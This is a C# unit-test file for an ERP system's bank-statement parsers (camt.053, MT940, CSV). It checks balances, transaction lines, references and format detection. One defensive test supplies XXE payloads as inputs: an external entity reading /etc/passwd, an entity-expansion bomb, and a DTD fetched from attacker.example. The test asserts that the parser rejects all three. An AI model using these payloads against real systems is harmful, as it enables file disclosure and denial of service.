using System.Text;
using Erp.Finance.Domain.Bank;
using Erp.Finance.Infrastructure.Bank.Formats;

namespace Erp.Finance.Tests.Bank;

/// <summary>
/// Cititoarele de extras (02.02, F2 3.4 si 6; criteriile F2-A1 si F2-A15) pe fisiere construite dupa specificatiile publice ISO 20022 si
/// SWIFT (TST-06): soldurile, liniile cu semn, referintele, contrapartida si detaliile; XML cu DTD refuzat inainte de procesare.
/// </summary>
public sealed class StatementParserTests
{
    private static readonly string Iban = StatementFiles.RomanianIban("RNCB", "0082004530120099");
    private static readonly string ClientIban = StatementFiles.RomanianIban("BTRL", "0130120245678901");
    private static readonly DateOnly Day = new(2026, 11, 2);

    private static readonly TestEntry[] Entries =
    [
        new(Day, 1250.50m, "REF-0001", "Agro Nord Distribuție SRL", ClientIban, "Plata factura FV 1234 CUI 14399840", "E2E-CLIENT-1"),
        new(Day, -300m, "REF-0002", "Furnizor Energie SA", StatementFiles.RomanianIban("BRDE", "0450SV12345678901"), "OP 77 factura 9981"),
        new(Day.AddDays(1), -12.40m, null, null, null, "Comision administrare cont"),
    ];

    [Theory]
    [Trait("Criteriu", "02.02-F2-A1")]
    [InlineData("urn:iso:std:iso:20022:tech:xsd:camt.053.001.02")]
    [InlineData("urn:iso:std:iso:20022:tech:xsd:camt.053.001.08")]
    public void Camt053_is_read_with_balances_signed_lines_references_and_counterparties(string ns)
    {
        var statement = Assert.Single(new Camt053Parser().Parse(StatementFiles.Camt053(Iban, "RON", 10_000m, Entries, "245", ns), null));

        Assert.Equal(Iban, statement.AccountIban);
        Assert.Equal("RON", statement.CurrencyCode);
        Assert.Equal("245", statement.StatementNo);
        Assert.Equal(10_000m, statement.OpeningBalance);
        Assert.Equal(10_938.10m, statement.ClosingBalance);
        Assert.Equal((Day, Day.AddDays(1)), (statement.PeriodFrom, statement.PeriodTo));
        Assert.Equal([1250.50m, -300m, -12.40m], statement.Lines.Select(l => l.Amount));
        var incoming = statement.Lines[0];
        Assert.Equal("Agro Nord Distribuție SRL", incoming.CounterpartyName);
        Assert.Equal(ClientIban, incoming.CounterpartyIban);
        Assert.Equal("E2E-CLIENT-1", incoming.EndToEndId);
        Assert.Equal("REF-0001", incoming.BankReference);
        Assert.Equal("PMNT/RCDT/ESCT", incoming.BankTransactionCode);
        Assert.Contains("CUI 14399840", incoming.RemittanceInfo);
        Assert.Equal("Furnizor Energie SA", statement.Lines[1].CounterpartyName);
        Assert.Null(statement.Lines[1].EndToEndId);
        Assert.Null(statement.Lines[2].BankReference);
        Assert.True(BankStatementRules.BalancesMatch(statement.OpeningBalance!.Value, statement.ClosingBalance!.Value, statement.Lines));
    }

    [Fact]
    [Trait("Criteriu", "02.02-F2-A1")]
    public void Camt053_skips_pending_entries_and_reads_several_statements()
    {
        var first = Encoding.UTF8.GetString(StatementFiles.Camt053(Iban, "RON", 100m, [new TestEntry(Day, 50m, "A1")], "1"));
        var pending = first.Replace("</Stmt>", """
            <Ntry><Amt Ccy="RON">999.00</Amt><CdtDbtInd>CRDT</CdtDbtInd><Sts>PDNG</Sts><BookgDt><Dt>2026-11-02</Dt></BookgDt></Ntry>
            </Stmt>
            <Stmt><Id>S2</Id><Acct><Id><IBAN>RO49RNCB0082004530120001</IBAN></Id><Ccy>EUR</Ccy></Acct>
              <Bal><Tp><CdOrPrtry><Cd>PRCD</Cd></CdOrPrtry></Tp><Amt Ccy="EUR">10.00</Amt><CdtDbtInd>DBIT</CdtDbtInd><Dt><Dt>2026-11-01</Dt></Dt></Bal>
              <Bal><Tp><CdOrPrtry><Cd>CLBD</Cd></CdOrPrtry></Tp><Amt Ccy="EUR">10.00</Amt><CdtDbtInd>DBIT</CdtDbtInd><Dt><Dt>2026-11-02</Dt></Dt></Bal>
            </Stmt>
            """, StringComparison.Ordinal);

        var statements = new Camt053Parser().Parse(Encoding.UTF8.GetBytes(pending), null);

        Assert.Equal(2, statements.Count);
        Assert.Equal(50m, Assert.Single(statements[0].Lines).Amount);
        Assert.Equal((-10m, -10m, "EUR"), (statements[1].OpeningBalance, statements[1].ClosingBalance, statements[1].CurrencyCode));
        Assert.Empty(statements[1].Lines);
    }

    [Theory]
    [Trait("Criteriu", "02.02-F2-A15")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE Document [<!ENTITY x SYSTEM "file:///etc/passwd">]><Document><BkToCstmrStmt>&x;</BkToCstmrStmt></Document>""")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;">]><Document>&lol2;</Document>""")]
    [InlineData("""<?xml version="1.0"?><!DOCTYPE Document SYSTEM "http://attacker.example/x.dtd"><Document/>""")]
    public void Xml_with_dtd_or_external_entities_is_refused_without_being_processed(string xml)
    {
        var ex = Assert.Throws<StatementFormatException>(() => new Camt053Parser().Parse(Encoding.UTF8.GetBytes(xml), null));
        Assert.Contains("DTD", ex.Message, StringComparison.Ordinal);
    }

    [Fact]
    public void A_file_that_is_not_camt053_is_refused_with_the_reason()
    {
        Assert.Throws<StatementFormatException>(() => new Camt053Parser().Parse("<Document><Other/></Document>"u8.ToArray(), null));
        Assert.Throws<StatementFormatException>(() => new Camt053Parser().Parse("nu este xml"u8.ToArray(), null));
    }

    [Fact]
    [Trait("Criteriu", "02.02-F2-A1")]
    public void Mt940_is_read_with_balances_lines_references_and_keyword_details()
    {
        var statement = Assert.Single(new Mt940Parser().Parse(StatementFiles.Mt940(Iban, "RON", 10_000m, Entries, "245"), null));

        Assert.Equal(Iban, statement.AccountIban);
        Assert.Equal(("RON", "245/1"), (statement.CurrencyCode, statement.StatementNo));
        Assert.Equal((10_000m, 10_938.10m), (statement.OpeningBalance, statement.ClosingBalance));
        Assert.Equal([1250.50m, -300m, -12.40m], statement.Lines.Select(l => l.Amount));
        var incoming = statement.Lines[0];
        Assert.Equal(("REF-0001", "E2E-CLIENT-1"), (incoming.BankReference, incoming.EndToEndId));
        Assert.Equal(("Agro Nord Distribuție SRL", ClientIban), (incoming.CounterpartyName, incoming.CounterpartyIban));
        Assert.Equal("Plata factura FV 1234 CUI 14399840", incoming.RemittanceInfo);
        Assert.Equal(Day.AddDays(1), statement.Lines[2].BookingDate);
        Assert.Null(statement.Lines[2].BankReference);
    }

    [Fact]
    [Trait("Criteriu", "02.02-F2-A1")]
    public void Mt940_reads_subfield_and_free_text_details_reversals_and_several_statements()
    {
        var text = $"""
            :20:A
            :25:{Iban}
            :28C:7
            :60F:C261101RON100,00
            :61:2611021102RD20,00NTRFNONREF//BANK-1
            :86:166?00SEPA?20Retur plata?21 gresita?30BTRLRO22?31{ClientIban}?32CLIENT?33 SRL
            :62F:C261102RON120,00
            -
            :20:B
            :25:{Iban}
            :60F:C261102RON120,00
            :61:261103D5,NTRFNONREF
            :86:Plata catre {ClientIban} contract 5
            :62F:C261103RON115,00
            -
            """;

        var statements = new Mt940Parser().Parse(Encoding.UTF8.GetBytes(text), null);

        Assert.Equal(2, statements.Count);
        var reversal = Assert.Single(statements[0].Lines);
        Assert.Equal(20m, reversal.Amount);
        Assert.Equal(("CLIENT SRL", ClientIban, "BTRLRO22"), (reversal.CounterpartyName, reversal.CounterpartyIban, reversal.CounterpartyBic));
        Assert.Equal("Retur plata gresita", reversal.RemittanceInfo);
        var free = Assert.Single(statements[1].Lines);
        Assert.Equal((-5m, ClientIban), (free.Amount, free.CounterpartyIban));
        Assert.Equal("RON", statements[1].CurrencyCode);
    }

    [Fact]
    public void Mt940_without_closing_balance_is_refused_with_the_line()
    {
        var ex = Assert.Throws<StatementFormatException>(() => new Mt940Parser().Parse(":20:A\n:25:X\n:60F:C261101RON1,00\n"u8.ToArray(), null));
        Assert.Equal(1, ex.Line);
    }

    [Fact]
    public void Csv_is_read_by_the_profile_mapping_with_debit_credit_columns_and_running_balance()
    {
        const string mapping = """
            {"separator":";","encoding":"windows-1250","headerRow":1,"dateFormat":"dd.MM.yyyy","decimalSeparator":",","thousandsSeparator":".",
             "columns":{"bookingDate":"Data","debit":"Debit","credit":"Credit","counterpartyName":"Partener","remittanceInfo":"Detalii",
                        "bankReference":"Referinta","balance":"Sold"}}
            """;
        const string csv = "Data;Debit;Credit;Partener;Detalii;Referinta;Sold\r\n"
            + "02.11.2026;;1.250,50;\"Client; SRL\";\"Plata \"\"FV 12\"\"\";R1;11.250,50\r\n"
            + "03.11.2026;300,00;;Furnizor;OP 7;R2;10.950,50\r\n";
        var content = Encoding.ASCII.GetBytes(csv);

        var statement = Assert.Single(new CsvStatementParser().Parse(content, mapping));

        Assert.Equal((10_000m, 10_950.50m), (statement.OpeningBalance, statement.ClosingBalance));
        Assert.Equal([1250.50m, -300m], statement.Lines.Select(l => l.Amount));
        Assert.Equal(("Client; SRL", "Plata \"FV 12\"", "R1"), (statement.Lines[0].CounterpartyName, statement.Lines[0].RemittanceInfo, statement.Lines[0].BankReference));
        Assert.Equal((new DateOnly(2026, 11, 2), new DateOnly(2026, 11, 3)), (statement.PeriodFrom, statement.PeriodTo));
    }

    [Fact]
    public void Csv_errors_name_the_row_and_mappings_are_checked()
    {
        const string mapping = """{"columns":{"bookingDate":"1","amount":"2"},"headerRow":0}""";
        var ex = Assert.Throws<StatementFormatException>(() => new CsvStatementParser().Parse("02.11.2026;10,00\n31.02.2026;5\n"u8.ToArray(), mapping));
        Assert.Equal(2, ex.Line);
        Assert.Throws<StatementFormatException>(() => CsvStatementMapping.Read("""{"columns":{"bookingDate":"Data"}}"""));
        Assert.Throws<StatementFormatException>(() => CsvStatementMapping.Read("nu e json"));
    }

    [Fact]
    [Trait("Criteriu", "02.02-F2-A2")]
    public void Computed_references_are_stable_and_number_identical_lines_of_the_same_day()
    {
        var same = new ParsedStatementLine(Day, null, -5m, null, null, null, "Comision", null, null, null, null, null);
        var withRef = same with { BankReference = "B-1" };
        var first = BankStatementRules.References(7, [same, same, withRef, withRef]);
        var again = BankStatementRules.References(7, [same, same, withRef, withRef]);

        Assert.Equal(first, again);
        Assert.Equal(4, first.Distinct().Count());
        Assert.Equal("B-1", first[2]);
        Assert.StartsWith("H:", first[0], StringComparison.Ordinal);
        Assert.NotEqual(first[0], BankStatementRules.References(8, [same])[0]);
    }

    [Theory]
    [InlineData(" ro49 rncb 0082 0045 3012 0001 ", "RO49RNCB0082004530120001")]
    [InlineData("", null)]
    public void Ibans_are_normalized(string input, string? expected) => Assert.Equal(expected, BankStatementRules.NormalizeIban(input));

    [Fact]
    public void The_format_is_detected_from_the_content()
    {
        Assert.Equal(StatementFormat.Camt053, BankStatementRules.Detect("﻿<?xml version=\"1.0\"?><Document/>"u8));
        Assert.Equal(StatementFormat.Mt940, BankStatementRules.Detect("{1:F01X}{2:O940}{4:\r\n:20:A"u8));
        Assert.Equal(StatementFormat.None, BankStatementRules.Detect("Data;Suma\n"u8));
    }
}
